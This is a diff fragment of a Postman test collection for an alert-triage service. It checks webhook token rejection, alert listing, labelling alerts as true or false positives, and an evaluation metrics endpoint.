+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (suppressed)', () => {",
+                  "  pm.response.to.have.status(202);",
+                  "});",
+                  "pm.test('classified as false positive via mock engine', () => {",
+                  "  const json = pm.response.json();",
+                  "  pm.expect(json.status).to.eql('suppressed');",
+                  "  pm.expect(json.triage.is_true_positive).to.eql(false);",
+                  "  pm.expect(json.triage.engine).to.eql('mock');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Invalid webhook token -> 401",
+          "id": "cfee6458-3695-485e-83f1-81460aa8c75e",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "this-is-not-the-configured-token"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"test-bad-token\",\n  \"rule\": {\n    \"level\": 1,\n    \"description\": \"test\"\n  }\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Severity kept low (1) so this stays on the false-positive path with no IRIS dependency. Only meaningful if WAZUH_WEBHOOK_TOKEN is set server-side - if the server has no token configured, this returns 202 instead (auth is disabled)."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('401 if server enforces a token (202 if auth disabled)', () => {",
+                  "  pm.expect([401, 202]).to.include(pm.response.code);",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "4. Alert management",
+      "description": "Run folders 1-3 first so these alert_ids exist. Labeling builds the evaluation dataset for GET /metrics.",
+      "item": [
+        {
+          "name": "List alerts",
+          "id": "7f9cf086-e560-4a49-9778-244729eb39f1",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts?limit=100",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ],
+              "query": [
+                {
+                  "key": "limit",
+                  "value": "100"
+                }
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('response is an array', () => pm.expect(pm.response.json()).to.be.an('array'));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Label test-sqli-union as true_positive",
+          "id": "76493748-e550-4a8a-9528-0d1fc88374fe",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ground_truth\": \"true_positive\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/test-sqli-union/label",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "test-sqli-union",
+                "label"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200 or 404 (run folder 2 first)', () => {",
+                  "  pm.expect([200, 404]).to.include(pm.response.code);",
+                  "});",
+                  "if (pm.response.code === 200) {",
+                  "  pm.test('ground_truth set', () => {",
+                  "    pm.expect(pm.response.json().ground_truth).to.eql('true_positive');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Label test-low-benign as false_positive",
+          "id": "152565c5-6c5f-428b-9ffb-b42521b232b7",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ground_truth\": \"false_positive\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/test-low-benign/label",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "test-low-benign",
+                "label"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200 or 404 (run folder 1 first)', () => {",
+                  "  pm.expect([200, 404]).to.include(pm.response.code);",
+                  "});",
+                  "if (pm.response.code === 200) {",
+                  "  pm.test('ground_truth set', () => {",
+                  "    pm.expect(pm.response.json().ground_truth).to.eql('false_positive');",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Label unknown alert -> 404",
+          "id": "cf782845-6904-47ae-a10d-b9ba06ac510d",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ground_truth\": \"true_positive\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/does-not-exist/label",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "does-not-exist",
+                "label"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 404', () => pm.response.to.have.status(404));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "5. Metrics",
+      "item": [
+        {
+          "name": "Get evaluation metrics",
+          "id": "c9492dea-841d-4ddb-8776-e5df7df05179",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/metrics",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "metrics"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('sample_size is a number', () => {",
+                  "  pm.expect(pm.response.json().sample_size).to.be.a('number');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        }
+      ]
+    }
+  ]
+}
